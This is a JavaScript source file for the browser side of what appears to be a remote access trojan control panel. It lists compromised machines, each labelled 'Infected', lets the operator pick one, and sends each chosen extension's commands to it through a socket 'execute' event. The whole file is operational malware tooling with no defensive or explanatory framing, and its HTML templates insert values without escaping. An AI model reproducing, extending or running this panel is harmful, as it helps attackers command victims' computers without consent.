const socket = io();

$(document).ready(async () => {
    await load();
    const extensions = await $.getJSON("/extensions");
    for (const extension of extensions) {
        $("#extensions").append(extensionBox(extension));
    };
});

socket.on("refresh", async () => {
    await load();
});

$("body").click(async (e) => {
    const target = e.target;
    const rat = $(target).attr("openrat");
    if (!rat) return;
    sessionStorage.setItem("rat", rat);
    await load();
});

$("body").click(async (e) => {
    const target = e.target;
    const ex = $(target).attr("execute");
    if (!ex) return;
    if (!sessionStorage.getItem("rat")) return;
    const extension = await $.getJSON(`/extension/${ex}`);
    for (const command of extension.run) {
        socket.emit("execute", command, sessionStorage.getItem("rat"));
    };
});

async function load() {
    $("#boxes").empty();
    if (sessionStorage.getItem("rat")) {
        $("#current_rat").text(sessionStorage.getItem("rat"));
        $("#main").toggleClass("show");
    } else {
        $("#current_rat").text("No RAT Selected");
    };
    const rats = await $.getJSON("/rats");
    $("#total_rats").text(rats.length);
    for (const rat of rats) {
        if (sessionStorage.getItem("rat")) {
            const r = sessionStorage.getItem("rat");
            if (rat == r) {
                $("#boxes").append(highlight_box(rat));
                continue;
            };
        };

        $("#boxes").append(box(rat));
    };
};

function extensionBox(extension) {
    return `<tr>
                <td class="sm:p-3 py-2 px-1 border-b border-gray-200 dark:border-gray-800">
                    <div class="flex items-center">
                        ${extension.name}
                    </div>
                </td>
                <td class="sm:p-3 py-2 px-1 border-b border-gray-200 dark:border-gray-800">
                    <div class="flex items-center">
                        ${extension.version}
                    </div>
                </td>
                <td
                    class="sm:p-3 py-2 px-1 border-b border-gray-200 dark:border-gray-800 md:table-cell hidden">
                    <div class="flex items-center">
                        <div class="sm:flex hidden flex-col">
                            ${extension.description}
                            <div class="text-gray-400 text-xs">${extension.type}</div>
                        </div>
                        <button execute="${extension.name}" class="w-8 h-8 inline-flex items-center justify-center text-green-500 ml-auto">
                            <i execute="${extension.name}" class="fa-solid fa-play"></i>
                        </button>
                    </div>
                </td>
            </tr>`;
};

function highlight_box(rat) {
    return `<button openrat="${rat}" class="bg-white p-3 w-full flex flex-col ring-blue-200 rounded-md dark:bg-gray-800 shadow">
        <div openrat="${rat}" class="flex xl:flex-row flex-col items-center font-medium text-gray-900 dark:text-white pb-2 mb-2 xl:border-b border-gray-200 border-opacity-75 dark:border-gray-700 w-full">
            ${rat}
        </div>
        <div openrat="${rat}" class="flex items-center w-full">
            <div openrat="${rat}"
                class="text-xs py-1 px-2 leading-none dark:bg-gray-900 bg-blue-100 text-red-500 rounded-md">
                Infected</div>
        </div>
    </button>`;
};

function box(rat) {
    return `<button openrat="${rat}" class="bg-white p-3 w-full flex flex-col rounded-md dark:bg-gray-800 shadow">
    <div openrat="${rat}" class="flex xl:flex-row flex-col items-center font-medium text-gray-900 dark:text-white pb-2 mb-2 xl:border-b border-gray-200 border-opacity-75 dark:border-gray-700 w-full">
        ${rat}
    </div>
    <div openrat="${rat}" class="flex items-center w-full">
        <div openrat="${rat}"
            class="text-xs py-1 px-2 leading-none dark:bg-gray-900 bg-blue-100 text-red-500 rounded-md">
            Infected</div>
    </div>
    </button>`;
};